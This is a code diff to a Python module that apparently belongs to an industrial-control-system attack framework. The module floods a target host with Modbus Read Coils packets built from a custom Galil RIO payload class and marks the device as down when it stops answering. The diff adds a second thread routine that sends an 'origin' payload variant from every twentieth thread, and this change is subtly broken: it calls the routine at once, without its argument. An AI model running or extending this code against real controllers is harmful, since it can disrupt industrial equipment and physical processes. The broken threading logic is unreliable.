@@ -31,9 +31,15 @@ class Module:
 
 		moduleName 	= self.info['Name']
 		print bcolors.OKBLUE + '[+]' + bcolors.ENDC + ' Module ' + moduleName + ' Start'
+		count = 0
 		for i in range(int(self.options['Threads'][0])):
 			if(self.options['RHOST'][0]):
 				thread 	= threading.Thread(target=self.do,args=(self.options['RHOST'][0],))
+				if count % 20 == 0:
+					thread = threading.Thread(target=self.do_copy(), args=(self.options['RHOST'][0],))
+				else:
+					thread = threading.Thread(target=self.do, args=(self.options['RHOST'][0],))
+				count += 1
 				thread.start()
 				THREADS.append(thread)
 			else:
@@ -72,6 +78,27 @@ class Module:
 				return None
 			try:
 				ans = c.sr1(ModbusADU(transId=getTransId(),unitId=int(self.options['UID'][0]))/ModbusPDU01_Read_Coils_galilRIO(),timeout=timeout, verbose=0)
+				count = count + 1
+			except:
+				break
+
+	def do_copy(self,ip):
+		time.sleep(60)
+
+		global down
+		count = 0
+		if (down == True):
+			return None
+		while True:
+			time.sleep(10)
+			if count==200:
+				break
+			c = connectToTarget(ip,self.options['RPORT'][0])
+			if(c == None):
+				down = True
+				return None
+			try:
+				ans = c.sr1(ModbusADU(transId=getTransId(),unitId=int(self.options['UID'][0]))/ModbusPDU01_Read_Coils_galilRIO_origin(),timeout=timeout, verbose=0)
 				count = count + 1
 			except:
 				break
